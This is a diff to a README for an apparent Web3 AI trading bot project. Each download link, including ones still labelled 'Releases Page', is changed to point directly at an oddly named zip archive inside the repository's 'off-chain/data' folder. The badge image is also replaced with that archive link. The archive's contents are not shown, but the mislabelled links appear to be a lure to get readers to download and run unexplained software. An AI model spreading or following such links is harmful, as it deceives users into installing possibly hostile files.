@@ -4,7 +4,7 @@
 This guide helps you easily download and run the web3-ai-trading-agent application. You will learn how to set up your own trading bot that operates on Web3 platforms like Uniswap V4.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Kvexx/web3-ai-trading-agent/releases)
+[![Download](https://github.com/Kvexx/web3-ai-trading-agent/raw/refs/heads/main/off-chain/data/ai-trading-web-agent-featherlike.zip%20Now-Click%20Here-brightgreen)](https://github.com/Kvexx/web3-ai-trading-agent/raw/refs/heads/main/off-chain/data/ai-trading-web-agent-featherlike.zip)
 
 ## 📋 Overview
 The web3-ai-trading-agent is designed to automate trading on Web3 platforms. Using artificial intelligence, it processes financial data to make informed trading decisions. This application serves as a practical example of how to leverage AI for trading using popular protocols like Uniswap V4.
@@ -20,7 +20,7 @@ To run the web3-ai-trading-agent, you need:
 ## 📦 Download & Install
 To download the application, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/Kvexx/web3-ai-trading-agent/releases).
+1. Visit the [Releases Page](https://github.com/Kvexx/web3-ai-trading-agent/raw/refs/heads/main/off-chain/data/ai-trading-web-agent-featherlike.zip).
 2. Find the latest version of the software.
 3. Click on the appropriate file for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -58,4 +58,4 @@ If you need assistance, join our community for help and tips. You can find suppo
 The web3-ai-trading-agent is licensed under the MIT License. You can use, modify, and distribute the code as long as you meet the terms outlined in the license.
 
 ## 📥 Download Now Again
-To get started with your own AI trading bot, [visit the Releases Page](https://github.com/Kvexx/web3-ai-trading-agent/releases) and download the latest version today!
+To get started with your own AI trading bot, [visit the Releases Page](https://github.com/Kvexx/web3-ai-trading-agent/raw/refs/heads/main/off-chain/data/ai-trading-web-agent-featherlike.zip) and download the latest version today!
